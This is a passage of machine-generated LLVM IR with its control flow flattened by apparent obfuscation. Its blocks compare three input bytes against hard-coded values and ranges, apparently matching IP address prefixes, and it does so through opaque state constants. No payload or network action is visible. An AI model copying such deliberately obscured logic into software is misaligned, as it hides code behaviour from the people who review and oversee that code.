  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2363:                                   ; preds = %loopEntry
  %2364 = load i8, i8* %2, align 1
  %2365 = zext i8 %2364 to i32
  %2366 = icmp eq i32 %2365, 199
  %2367 = select i1 %2366, i32 643009036, i32 1683753647
  store i32 %2367, i32* %switchVar
  br label %loopEnd

; <label>:2368:                                   ; preds = %loopEntry
  %2369 = load i8, i8* %3, align 1
  %2370 = zext i8 %2369 to i32
  %2371 = icmp eq i32 %2370, 229
  %2372 = select i1 %2371, i32 1045338205, i32 1683753647
  store i32 %2372, i32* %switchVar
  br label %loopEnd

; <label>:2373:                                   ; preds = %loopEntry
  %2374 = load i8, i8* %4, align 1
  %2375 = zext i8 %2374 to i32
  %2376 = icmp sge i32 %2375, 248
  %2377 = select i1 %2376, i32 9082897, i32 1683753647
  store i32 %2377, i32* %switchVar
  br label %loopEnd

; <label>:2378:                                   ; preds = %loopEntry
  %2379 = load i8, i8* %4, align 1
  %2380 = zext i8 %2379 to i32
  %2381 = icmp slt i32 %2380, 255
  %2382 = select i1 %2381, i32 1839754081, i32 1683753647
  store i32 %2382, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2383:                                   ; preds = %loopEntry
  %2384 = load i8, i8* %2, align 1
  %2385 = zext i8 %2384 to i32
  %2386 = icmp eq i32 %2385, 199
  %2387 = select i1 %2386, i32 1775877460, i32 -1268041238
  store i32 %2387, i32* %switchVar
  br label %loopEnd

; <label>:2388:                                   ; preds = %loopEntry
  %2389 = load i8, i8* %3, align 1
  %2390 = zext i8 %2389 to i32
  %2391 = icmp eq i32 %2390, 36
  %2392 = select i1 %2391, i32 -1246153676, i32 -1268041238
  store i32 %2392, i32* %switchVar
  br label %loopEnd

; <label>:2393:                                   ; preds = %loopEntry
  %2394 = load i8, i8* %4, align 1
  %2395 = zext i8 %2394 to i32
  %2396 = icmp sge i32 %2395, 220
  %2397 = select i1 %2396, i32 116059995, i32 -1268041238
  store i32 %2397, i32* %switchVar
  br label %loopEnd

; <label>:2398:                                   ; preds = %loopEntry
  %2399 = load i8, i8* %4, align 1
  %2400 = zext i8 %2399 to i32
  %2401 = icmp slt i32 %2400, 223
  %2402 = select i1 %2401, i32 1839754081, i32 -1268041238
  store i32 %2402, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2403:                                   ; preds = %loopEntry
  %2404 = load i8, i8* %2, align 1
  %2405 = zext i8 %2404 to i32
  %2406 = icmp eq i32 %2405, 199
  %2407 = select i1 %2406, i32 672115686, i32 1351587047
  store i32 %2407, i32* %switchVar
  br label %loopEnd

; <label>:2408:                                   ; preds = %loopEntry
  %2409 = load i8, i8* %3, align 1
  %2410 = zext i8 %2409 to i32
  %2411 = icmp eq i32 %2410, 58
  %2412 = select i1 %2411, i32 -658136503, i32 1351587047
  store i32 %2412, i32* %switchVar
  br label %loopEnd

; <label>:2413:                                   ; preds = %loopEntry
  %2414 = load i8, i8* %4, align 1
  %2415 = zext i8 %2414 to i32
  %2416 = icmp sge i32 %2415, 184
  %2417 = select i1 %2416, i32 1468029963, i32 1351587047
  store i32 %2417, i32* %switchVar
  br label %loopEnd

; <label>:2418:                                   ; preds = %loopEntry
  %2419 = load i8, i8* %4, align 1
  %2420 = zext i8 %2419 to i32
  %2421 = icmp slt i32 %2420, 187
  %2422 = select i1 %2421, i32 1839754081, i32 1351587047
  store i32 %2422, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2423:                                   ; preds = %loopEntry
  %2424 = load i8, i8* %2, align 1
  %2425 = zext i8 %2424 to i32
  %2426 = icmp eq i32 %2425, 206
  %2427 = select i1 %2426, i32 -1734389181, i32 1825563961
  store i32 %2427, i32* %switchVar
  br label %loopEnd

; <label>:2428:                                   ; preds = %loopEntry
  %2429 = load i8, i8* %3, align 1
  %2430 = zext i8 %2429 to i32
  %2431 = icmp eq i32 %2430, 220
  %2432 = select i1 %2431, i32 -82682686, i32 1825563961
  store i32 %2432, i32* %switchVar
  br label %loopEnd

; <label>:2433:                                   ; preds = %loopEntry
  %2434 = load i8, i8* %4, align 1
  %2435 = zext i8 %2434 to i32
  %2436 = icmp sge i32 %2435, 172
  %2437 = select i1 %2436, i32 270841293, i32 1825563961
  store i32 %2437, i32* %switchVar
  br label %loopEnd

; <label>:2438:                                   ; preds = %loopEntry
  %2439 = load i8, i8* %4, align 1
  %2440 = zext i8 %2439 to i32
  %2441 = icmp slt i32 %2440, 175
  %2442 = select i1 %2441, i32 1839754081, i32 1825563961
  store i32 %2442, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2443:                                   ; preds = %loopEntry
  %2444 = load i8, i8* %2, align 1
  %2445 = zext i8 %2444 to i32
  %2446 = icmp eq i32 %2445, 208
  %2447 = select i1 %2446, i32 1102766922, i32 1481710653
  store i32 %2447, i32* %switchVar
  br label %loopEnd

; <label>:2448:                                   ; preds = %loopEntry
  %2449 = load i8, i8* %3, align 1
  %2450 = zext i8 %2449 to i32
  %2451 = icmp eq i32 %2450, 78
  %2452 = select i1 %2451, i32 1583654770, i32 1481710653
  store i32 %2452, i32* %switchVar
  br label %loopEnd

; <label>:2453:                                   ; preds = %loopEntry
  %2454 = load i8, i8* %4, align 1
  %2455 = zext i8 %2454 to i32
  %2456 = icmp sge i32 %2455, 40
  %2457 = select i1 %2456, i32 -208487629, i32 1481710653
  store i32 %2457, i32* %switchVar
  br label %loopEnd

; <label>:2458:                                   ; preds = %loopEntry
  %2459 = load i8, i8* %4, align 1
  %2460 = zext i8 %2459 to i32
  %2461 = icmp slt i32 %2460, 43
  %2462 = select i1 %2461, i32 1839754081, i32 1481710653
  store i32 %2462, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2463:                                   ; preds = %loopEntry
  %2464 = load i8, i8* %2, align 1
  %2465 = zext i8 %2464 to i32
  %2466 = icmp eq i32 %2465, 208
  %2467 = select i1 %2466, i32 1981118687, i32 1343284571
  store i32 %2467, i32* %switchVar
  br label %loopEnd

; <label>:2468:                                   ; preds = %loopEntry
  %2469 = load i8, i8* %3, align 1
  %2470 = zext i8 %2469 to i32
  %2471 = icmp eq i32 %2470, 93
  %2472 = select i1 %2471, i32 2110712171, i32 1343284571
  store i32 %2472, i32* %switchVar
  br label %loopEnd

; <label>:2473:                                   ; preds = %loopEntry
  %2474 = load i8, i8* %4, align 1
  %2475 = zext i8 %2474 to i32
  %2476 = icmp sge i32 %2475, 192
  %2477 = select i1 %2476, i32 1738694669, i32 1343284571
  store i32 %2477, i32* %switchVar
  br label %loopEnd

; <label>:2478:                                   ; preds = %loopEntry
  %2479 = load i8, i8* %4, align 1
  %2480 = zext i8 %2479 to i32
  %2481 = icmp slt i32 %2480, 193
  %2482 = select i1 %2481, i32 1839754081, i32 1343284571
  store i32 %2482, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2483:                                   ; preds = %loopEntry
  %2484 = load i8, i8* %2, align 1
  %2485 = zext i8 %2484 to i32
  %2486 = icmp eq i32 %2485, 66
  %2487 = select i1 %2486, i32 1612589610, i32 -911895179
  store i32 %2487, i32* %switchVar
  br label %loopEnd

; <label>:2488:                                   ; preds = %loopEntry
  %2489 = load i8, i8* %3, align 1
  %2490 = zext i8 %2489 to i32
  %2491 = icmp eq i32 %2490, 71
  %2492 = select i1 %2491, i32 -1454458667, i32 -911895179
  store i32 %2492, i32* %switchVar
  br label %loopEnd

; <label>:2493:                                   ; preds = %loopEntry
  %2494 = load i8, i8* %4, align 1
  %2495 = zext i8 %2494 to i32
  %2496 = icmp sge i32 %2495, 240
  %2497 = select i1 %2496, i32 -102880607, i32 -911895179
  store i32 %2497, i32* %switchVar
  br label %loopEnd

; <label>:2498:                                   ; preds = %loopEntry
  %2499 = load i8, i8* %4, align 1
  %2500 = zext i8 %2499 to i32
  %2501 = icmp slt i32 %2500, 255
  %2502 = select i1 %2501, i32 1839754081, i32 -911895179
  store i32 %2502, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2503:                                   ; preds = %loopEntry
  %2504 = load i8, i8* %2, align 1
  %2505 = zext i8 %2504 to i32
  %2506 = icmp eq i32 %2505, 98
  %2507 = select i1 %2506, i32 1487055813, i32 1023979996
  store i32 %2507, i32* %switchVar
  br label %loopEnd

; <label>:2508:                                   ; preds = %loopEntry
  %2509 = load i8, i8* %3, align 1
  %2510 = zext i8 %2509 to i32
  %2511 = icmp eq i32 %2510, 142
  %2512 = select i1 %2511, i32 -511958314, i32 1023979996
  store i32 %2512, i32* %switchVar
  br label %loopEnd

; <label>:2513:                                   ; preds = %loopEntry
  %2514 = load i8, i8* %4, align 1
  %2515 = zext i8 %2514 to i32
  %2516 = icmp sge i32 %2515, 208
  %2517 = select i1 %2516, i32 1851330361, i32 1023979996
  store i32 %2517, i32* %switchVar
  br label %loopEnd

; <label>:2518:                                   ; preds = %loopEntry
  %2519 = load i8, i8* %4, align 1
  %2520 = zext i8 %2519 to i32
  %2521 = icmp slt i32 %2520, 223
  %2522 = select i1 %2521, i32 1839754081, i32 1023979996
  store i32 %2522, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2523:                                   ; preds = %loopEntry
  %2524 = load i8, i8* %2, align 1
  %2525 = zext i8 %2524 to i32
  %2526 = icmp eq i32 %2525, 107
  %2527 = select i1 %2526, i32 1159884383, i32 1847046415
  store i32 %2527, i32* %switchVar
  br label %loopEnd

; <label>:2528:                                   ; preds = %loopEntry
  %2529 = load i8, i8* %3, align 1
  %2530 = zext i8 %2529 to i32
  %2531 = icmp sge i32 %2530, 20
  %2532 = select i1 %2531, i32 538046364, i32 1847046415
  store i32 %2532, i32* %switchVar
  br label %loopEnd

; <label>:2533:                                   ; preds = %loopEntry
  %2534 = load i8, i8* %3, align 1
  %2535 = zext i8 %2534 to i32
  %2536 = icmp slt i32 %2535, 24
  %2537 = select i1 %2536, i32 1839754081, i32 1847046415
  store i32 %2537, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2538:                                   ; preds = %loopEntry
  %2539 = load i8, i8* %2, align 1
  %2540 = zext i8 %2539 to i32
  %2541 = icmp eq i32 %2540, 35
  %2542 = select i1 %2541, i32 -1632879794, i32 1027477624
  store i32 %2542, i32* %switchVar
  br label %loopEnd

; <label>:2543:                                   ; preds = %loopEntry
  %2544 = load i8, i8* %3, align 1
  %2545 = zext i8 %2544 to i32
  %2546 = icmp sge i32 %2545, 159
  %2547 = select i1 %2546, i32 -886317280, i32 1027477624
  store i32 %2547, i32* %switchVar
  br label %loopEnd

; <label>:2548:                                   ; preds = %loopEntry
  %2549 = load i8, i8* %3, align 1
  %2550 = zext i8 %2549 to i32
  %2551 = icmp slt i32 %2550, 183
  %2552 = select i1 %2551, i32 1839754081, i32 1027477624
  store i32 %2552, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2553:                                   ; preds = %loopEntry
  %2554 = load i8, i8* %2, align 1
  %2555 = zext i8 %2554 to i32
  %2556 = icmp eq i32 %2555, 52
  %2557 = select i1 %2556, i32 -79900131, i32 713700903
  store i32 %2557, i32* %switchVar
  br label %loopEnd

; <label>:2558:                                   ; preds = %loopEntry
  %2559 = load i8, i8* %3, align 1
  %2560 = zext i8 %2559 to i32
  %2561 = icmp sge i32 %2560, 1
  %2562 = select i1 %2561, i32 -1448110092, i32 713700903
  store i32 %2562, i32* %switchVar
  br label %loopEnd

; <label>:2563:                                   ; preds = %loopEntry
  %2564 = load i8, i8* %3, align 1
  %2565 = zext i8 %2564 to i32
  %2566 = icmp slt i32 %2565, 95
  %2567 = select i1 %2566, i32 1839754081, i32 713700903
  store i32 %2567, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2568:                                   ; preds = %loopEntry
  %2569 = load i8, i8* %2, align 1
  %2570 = zext i8 %2569 to i32
  %2571 = icmp eq i32 %2570, 52
  %2572 = select i1 %2571, i32 366481858, i32 1529651006
  store i32 %2572, i32* %switchVar
  br label %loopEnd

; <label>:2573:                                   ; preds = %loopEntry
  %2574 = load i8, i8* %3, align 1
  %2575 = zext i8 %2574 to i32
  %2576 = icmp sge i32 %2575, 95
  %2577 = select i1 %2576, i32 159418938, i32 1529651006
  store i32 %2577, i32* %switchVar
  br label %loopEnd

; <label>:2578:                                   ; preds = %loopEntry
  %2579 = load i8, i8* %3, align 1
  %2580 = zext i8 %2579 to i32
  %2581 = icmp slt i32 %2580, 255
  %2582 = select i1 %2581, i32 1839754081, i32 1529651006
  store i32 %2582, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2583:                                   ; preds = %loopEntry
  %2584 = load i8, i8* %2, align 1
  %2585 = zext i8 %2584 to i32
  %2586 = icmp eq i32 %2585, 54
  %2587 = select i1 %2586, i32 43864335, i32 -2108562417
  store i32 %2587, i32* %switchVar
  br label %loopEnd

; <label>:2588:                                   ; preds = %loopEntry
  %2589 = load i8, i8* %3, align 1
  %2590 = zext i8 %2589 to i32
  %2591 = icmp sge i32 %2590, 64
  %2592 = select i1 %2591, i32 -1274117037, i32 -2108562417
  store i32 %2592, i32* %switchVar
  br label %loopEnd

; <label>:2593:                                   ; preds = %loopEntry
  %2594 = load i8, i8* %3, align 1
  %2595 = zext i8 %2594 to i32
  %2596 = icmp slt i32 %2595, 95
  %2597 = select i1 %2596, i32 1839754081, i32 -2108562417
  store i32 %2597, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2598:                                   ; preds = %loopEntry
  %2599 = load i8, i8* %2, align 1
  %2600 = zext i8 %2599 to i32
  %2601 = icmp eq i32 %2600, 54
  %2602 = select i1 %2601, i32 130025370, i32 -1012696758
  store i32 %2602, i32* %switchVar
  br label %loopEnd

; <label>:2603:                                   ; preds = %loopEntry
  %2604 = load i8, i8* %3, align 1
  %2605 = zext i8 %2604 to i32
  %2606 = icmp sge i32 %2605, 144
  %2607 = select i1 %2606, i32 -824868655, i32 -1012696758
  store i32 %2607, i32* %switchVar
  br label %loopEnd

; <label>:2608:                                   ; preds = %loopEntry
  %2609 = load i8, i8* %3, align 1
  %2610 = zext i8 %2609 to i32
  %2611 = icmp slt i32 %2610, 255
  %2612 = select i1 %2611, i32 1839754081, i32 -1012696758
  store i32 %2612, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2613:                                   ; preds = %loopEntry
  %2614 = load i8, i8* %2, align 1
  %2615 = zext i8 %2614 to i32
  %2616 = icmp eq i32 %2615, 13
  %2617 = select i1 %2616, i32 -1563200280, i32 1057384230
  store i32 %2617, i32* %switchVar
  br label %loopEnd

; <label>:2618:                                   ; preds = %loopEntry
  %2619 = load i8, i8* %3, align 1
  %2620 = zext i8 %2619 to i32
  %2621 = icmp sge i32 %2620, 52
  %2622 = select i1 %2621, i32 1195088447, i32 1057384230
  store i32 %2622, i32* %switchVar
  br label %loopEnd

; <label>:2623:                                   ; preds = %loopEntry
  %2624 = load i8, i8* %3, align 1
  %2625 = zext i8 %2624 to i32
  %2626 = icmp slt i32 %2625, 60
  %2627 = select i1 %2626, i32 1839754081, i32 1057384230
  store i32 %2627, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2628:                                   ; preds = %loopEntry
  %2629 = load i8, i8* %2, align 1
  %2630 = zext i8 %2629 to i32
  %2631 = icmp eq i32 %2630, 13
  %2632 = select i1 %2631, i32 1774342067, i32 -426474787
  store i32 %2632, i32* %switchVar
  br label %loopEnd

; <label>:2633:                                   ; preds = %loopEntry
  %2634 = load i8, i8* %3, align 1
  %2635 = zext i8 %2634 to i32
  %2636 = icmp sge i32 %2635, 112
  %2637 = select i1 %2636, i32 -878029768, i32 -426474787
  store i32 %2637, i32* %switchVar
  br label %loopEnd

; <label>:2638:                                   ; preds = %loopEntry
  %2639 = load i8, i8* %3, align 1
  %2640 = zext i8 %2639 to i32
  %2641 = icmp slt i32 %2640, 115
  %2642 = select i1 %2641, i32 1839754081, i32 -426474787
  store i32 %2642, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2643:                                   ; preds = %loopEntry
  %2644 = load i8, i8* %2, align 1
  %2645 = zext i8 %2644 to i32
  %2646 = icmp eq i32 %2645, 163
  %2647 = select i1 %2646, i32 1301520419, i32 -1845210996
  store i32 %2647, i32* %switchVar
  br label %loopEnd

; <label>:2648:                                   ; preds = %loopEntry
  %2649 = load i8, i8* %3, align 1
  %2650 = zext i8 %2649 to i32
  %2651 = icmp eq i32 %2650, 172
  %2652 = select i1 %2651, i32 1839754081, i32 -1845210996
  store i32 %2652, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2653:                                   ; preds = %loopEntry
  %2654 = load i8, i8* %2, align 1
  %2655 = zext i8 %2654 to i32
  %2656 = icmp eq i32 %2655, 51
  %2657 = select i1 %2656, i32 -645046710, i32 -652498588
  store i32 %2657, i32* %switchVar
  br label %loopEnd

; <label>:2658:                                   ; preds = %loopEntry
  %2659 = load i8, i8* %3, align 1
  %2660 = zext i8 %2659 to i32
  %2661 = icmp sge i32 %2660, 15
  %2662 = select i1 %2661, i32 -867149627, i32 -652498588
  store i32 %2662, i32* %switchVar
  br label %loopEnd

; <label>:2663:                                   ; preds = %loopEntry
  %2664 = load i8, i8* %3, align 1
  %2665 = zext i8 %2664 to i32
  %2666 = icmp slt i32 %2665, 255
  %2667 = select i1 %2666, i32 1839754081, i32 -652498588
  store i32 %2667, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2668:                                   ; preds = %loopEntry
  %2669 = load i8, i8* %2, align 1
  %2670 = zext i8 %2669 to i32
  %2671 = icmp eq i32 %2670, 79
  %2672 = select i1 %2671, i32 -1596956305, i32 1305380603
  store i32 %2672, i32* %switchVar
  br label %loopEnd

; <label>:2673:                                   ; preds = %loopEntry
  %2674 = load i8, i8* %3, align 1
  %2675 = zext i8 %2674 to i32
  %2676 = icmp eq i32 %2675, 121
  %2677 = select i1 %2676, i32 572704002, i32 1305380603
  store i32 %2677, i32* %switchVar
  br label %loopEnd

; <label>:2678:                                   ; preds = %loopEntry
  %2679 = load i8, i8* %4, align 1
  %2680 = zext i8 %2679 to i32
  %2681 = icmp sge i32 %2680, 128
  %2682 = select i1 %2681, i32 -1248071113, i32 1305380603
  store i32 %2682, i32* %switchVar
  br label %loopEnd

; <label>:2683:                                   ; preds = %loopEntry
  %2684 = load i8, i8* %4, align 1
  %2685 = zext i8 %2684 to i32
  %2686 = icmp slt i32 %2685, 255
  %2687 = select i1 %2686, i32 1839754081, i32 1305380603
  store i32 %2687, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2688:                                   ; preds = %loopEntry
  %2689 = load i8, i8* %2, align 1
  %2690 = zext i8 %2689 to i32
  %2691 = icmp eq i32 %2690, 212
  %2692 = select i1 %2691, i32 -234532416, i32 245541082
  store i32 %2692, i32* %switchVar
  br label %loopEnd

; <label>:2693:                                   ; preds = %loopEntry
  %2694 = load i8, i8* %3, align 1
  %2695 = zext i8 %2694 to i32
  %2696 = icmp eq i32 %2695, 47
  %2697 = select i1 %2696, i32 1641849451, i32 245541082
  store i32 %2697, i32* %switchVar
  br label %loopEnd

; <label>:2698:                                   ; preds = %loopEntry
  %2699 = load i8, i8* %4, align 1
  %2700 = zext i8 %2699 to i32
  %2701 = icmp sge i32 %2700, 224
  %2702 = select i1 %2701, i32 -1665184934, i32 245541082
  store i32 %2702, i32* %switchVar
  br label %loopEnd

; <label>:2703:                                   ; preds = %loopEntry
  %2704 = load i8, i8* %4, align 1
  %2705 = zext i8 %2704 to i32
  %2706 = icmp slt i32 %2705, 255
  %2707 = select i1 %2706, i32 1839754081, i32 245541082
  store i32 %2707, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2708:                                   ; preds = %loopEntry
  %2709 = load i8, i8* %2, align 1
  %2710 = zext i8 %2709 to i32
  %2711 = icmp eq i32 %2710, 89
  %2712 = select i1 %2711, i32 1388238865, i32 -707178766
  store i32 %2712, i32* %switchVar
  br label %loopEnd

; <label>:2713:                                   ; preds = %loopEntry
  %2714 = load i8, i8* %3, align 1
  %2715 = zext i8 %2714 to i32
  %2716 = icmp eq i32 %2715, 34
  %2717 = select i1 %2716, i32 1669401898, i32 -707178766
  store i32 %2717, i32* %switchVar
  br label %loopEnd

; <label>:2718:                                   ; preds = %loopEntry
  %2719 = load i8, i8* %4, align 1
  %2720 = zext i8 %2719 to i32
  %2721 = icmp sge i32 %2720, 96
  %2722 = select i1 %2721, i32 -1315609850, i32 -707178766
  store i32 %2722, i32* %switchVar
  br label %loopEnd

; <label>:2723:                                   ; preds = %loopEntry
  %2724 = load i8, i8* %4, align 1
  %2725 = zext i8 %2724 to i32
  %2726 = icmp slt i32 %2725, 97
  %2727 = select i1 %2726, i32 1839754081, i32 -707178766
  store i32 %2727, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2728:                                   ; preds = %loopEntry
  %2729 = load i8, i8* %2, align 1
  %2730 = zext i8 %2729 to i32
  %2731 = icmp eq i32 %2730, 219
  %2732 = select i1 %2731, i32 1262254553, i32 1634459401
  store i32 %2732, i32* %switchVar
  br label %loopEnd

; <label>:2733:                                   ; preds = %loopEntry
  %2734 = load i8, i8* %3, align 1
  %2735 = zext i8 %2734 to i32
  %2736 = icmp sge i32 %2735, 216
  %2737 = select i1 %2736, i32 -2072637050, i32 1634459401
  store i32 %2737, i32* %switchVar
  br label %loopEnd

; <label>:2738:                                   ; preds = %loopEntry
  %2739 = load i8, i8* %3, align 1
  %2740 = zext i8 %2739 to i32
  %2741 = icmp slt i32 %2740, 231
  %2742 = select i1 %2741, i32 1839754081, i32 1634459401
  store i32 %2742, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2743:                                   ; preds = %loopEntry
  %2744 = load i8, i8* %2, align 1
  %2745 = zext i8 %2744 to i32
  %2746 = icmp eq i32 %2745, 23
  %2747 = select i1 %2746, i32 -1475921090, i32 -566595132
  store i32 %2747, i32* %switchVar
  br label %loopEnd

; <label>:2748:                                   ; preds = %loopEntry
  %2749 = load i8, i8* %3, align 1
  %2750 = zext i8 %2749 to i32
  %2751 = icmp sge i32 %2750, 94
  %2752 = select i1 %2751, i32 -298075234, i32 -566595132
  store i32 %2752, i32* %switchVar
  br label %loopEnd

; <label>:2753:                                   ; preds = %loopEntry
  %2754 = load i8, i8* %3, align 1
  %2755 = zext i8 %2754 to i32
  %2756 = icmp slt i32 %2755, 109
  %2757 = select i1 %2756, i32 1839754081, i32 -566595132
  store i32 %2757, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2758:                                   ; preds = %loopEntry
  %2759 = load i8, i8* %2, align 1
  %2760 = zext i8 %2759 to i32
  %2761 = icmp eq i32 %2760, 178
  %2762 = select i1 %2761, i32 1491655755, i32 -649601022
  store i32 %2762, i32* %switchVar
  br label %loopEnd

; <label>:2763:                                   ; preds = %loopEntry
  %2764 = load i8, i8* %3, align 1
  %2765 = zext i8 %2764 to i32
  %2766 = icmp sge i32 %2765, 62
  %2767 = select i1 %2766, i32 -276249081, i32 -649601022
  store i32 %2767, i32* %switchVar
  br label %loopEnd

; <label>:2768:                                   ; preds = %loopEntry
  %2769 = load i8, i8* %3, align 1
  %2770 = zext i8 %2769 to i32
  %2771 = icmp slt i32 %2770, 63
  %2772 = select i1 %2771, i32 1839754081, i32 -649601022
  store i32 %2772, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2773:                                   ; preds = %loopEntry
  %2774 = load i8, i8* %2, align 1
  %2775 = zext i8 %2774 to i32
  %2776 = icmp eq i32 %2775, 106
  %2777 = select i1 %2776, i32 1231315148, i32 1203229400
  store i32 %2777, i32* %switchVar
  br label %loopEnd

; <label>:2778:                                   ; preds = %loopEntry
  %2779 = load i8, i8* %3, align 1
  %2780 = zext i8 %2779 to i32
  %2781 = icmp sge i32 %2780, 182
  %2782 = select i1 %2781, i32 -1056904690, i32 1203229400
  store i32 %2782, i32* %switchVar
  br label %loopEnd

; <label>:2783:                                   ; preds = %loopEntry
  %2784 = load i8, i8* %3, align 1
  %2785 = zext i8 %2784 to i32
  %2786 = icmp slt i32 %2785, 189
  %2787 = select i1 %2786, i32 1839754081, i32 1203229400
  store i32 %2787, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2788:                                   ; preds = %loopEntry
  %2789 = load i8, i8* %2, align 1
  %2790 = zext i8 %2789 to i32
  %2791 = icmp eq i32 %2790, 34
  %2792 = select i1 %2791, i32 -1123595069, i32 446160188
  store i32 %2792, i32* %switchVar
  br label %loopEnd

; <label>:2793:                                   ; preds = %loopEntry
  %2794 = load i8, i8* %3, align 1
  %2795 = zext i8 %2794 to i32
  %2796 = icmp sge i32 %2795, 245
  %2797 = select i1 %2796, i32 -155839525, i32 446160188
  store i32 %2797, i32* %switchVar
  br label %loopEnd

; <label>:2798:                                   ; preds = %loopEntry
  %2799 = load i8, i8* %3, align 1
  %2800 = zext i8 %2799 to i32
  %2801 = icmp slt i32 %2800, 255
  %2802 = select i1 %2801, i32 1839754081, i32 446160188
  store i32 %2802, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2803:                                   ; preds = %loopEntry
  %2804 = load i8, i8* %2, align 1
  %2805 = zext i8 %2804 to i32
  %2806 = icmp eq i32 %2805, 87
  %2807 = select i1 %2806, i32 -590953133, i32 366238630
  store i32 %2807, i32* %switchVar
  br label %loopEnd

; <label>:2808:                                   ; preds = %loopEntry
  %2809 = load i8, i8* %3, align 1
  %2810 = zext i8 %2809 to i32
  %2811 = icmp sge i32 %2810, 97
  %2812 = select i1 %2811, i32 962855743, i32 366238630
  store i32 %2812, i32* %switchVar
  br label %loopEnd

; <label>:2813:                                   ; preds = %loopEntry
  %2814 = load i8, i8* %3, align 1
  %2815 = zext i8 %2814 to i32
  %2816 = icmp slt i32 %2815, 99
  %2817 = select i1 %2816, i32 1839754081, i32 366238630
  store i32 %2817, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2818:                                   ; preds = %loopEntry
  %2819 = load i8, i8* %2, align 1
  %2820 = zext i8 %2819 to i32
  %2821 = icmp eq i32 %2820, 86
  %2822 = select i1 %2821, i32 210920334, i32 1791676274
  store i32 %2822, i32* %switchVar
  br label %loopEnd

; <label>:2823:                                   ; preds = %loopEntry
  %2824 = load i8, i8* %3, align 1
  %2825 = zext i8 %2824 to i32
  %2826 = icmp eq i32 %2825, 208
  %2827 = select i1 %2826, i32 1839754081, i32 1791676274
  store i32 %2827, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2828:                                   ; preds = %loopEntry
  %2829 = load i8, i8* %2, align 1
  %2830 = zext i8 %2829 to i32
  %2831 = icmp eq i32 %2830, 86
  %2832 = select i1 %2831, i32 -881321777, i32 2088178526
  store i32 %2832, i32* %switchVar
  br label %loopEnd

; <label>:2833:                                   ; preds = %loopEntry
  %2834 = load i8, i8* %3, align 1
  %2835 = zext i8 %2834 to i32
  %2836 = icmp eq i32 %2835, 209
  %2837 = select i1 %2836, i32 1839754081, i32 2088178526
  store i32 %2837, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2838:                                   ; preds = %loopEntry
  %2839 = load i8, i8* %2, align 1
  %2840 = zext i8 %2839 to i32
  %2841 = icmp eq i32 %2840, 193
  %2842 = select i1 %2841, i32 -289131593, i32 1748339016
  store i32 %2842, i32* %switchVar
  br label %loopEnd

; <label>:2843:                                   ; preds = %loopEntry
  %2844 = load i8, i8* %3, align 1
  %2845 = zext i8 %2844 to i32
  %2846 = icmp eq i32 %2845, 164
  %2847 = select i1 %2846, i32 1839754081, i32 1748339016
  store i32 %2847, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2848:                                   ; preds = %loopEntry
  %2849 = load i8, i8* %2, align 1
  %2850 = zext i8 %2849 to i32
  %2851 = icmp eq i32 %2850, 120
  %2852 = select i1 %2851, i32 -1145895189, i32 1754678385
  store i32 %2852, i32* %switchVar
  br label %loopEnd

; <label>:2853:                                   ; preds = %loopEntry
  %2854 = load i8, i8* %3, align 1
  %2855 = zext i8 %2854 to i32
  %2856 = icmp sge i32 %2855, 103
  %2857 = select i1 %2856, i32 -793602611, i32 1754678385
  store i32 %2857, i32* %switchVar
  br label %loopEnd

; <label>:2858:                                   ; preds = %loopEntry
  %2859 = load i8, i8* %3, align 1
  %2860 = zext i8 %2859 to i32
  %2861 = icmp slt i32 %2860, 108
  %2862 = select i1 %2861, i32 1839754081, i32 1754678385
  store i32 %2862, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2863:                                   ; preds = %loopEntry
  %2864 = load i8, i8* %2, align 1
  %2865 = zext i8 %2864 to i32
  %2866 = icmp eq i32 %2865, 188
  %2867 = select i1 %2866, i32 -2143075683, i32 -1111816754
  store i32 %2867, i32* %switchVar
  br label %loopEnd

; <label>:2868:                                   ; preds = %loopEntry
  %2869 = load i8, i8* %3, align 1
  %2870 = zext i8 %2869 to i32
  %2871 = icmp eq i32 %2870, 68
  %2872 = select i1 %2871, i32 1839754081, i32 -1111816754
  store i32 %2872, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

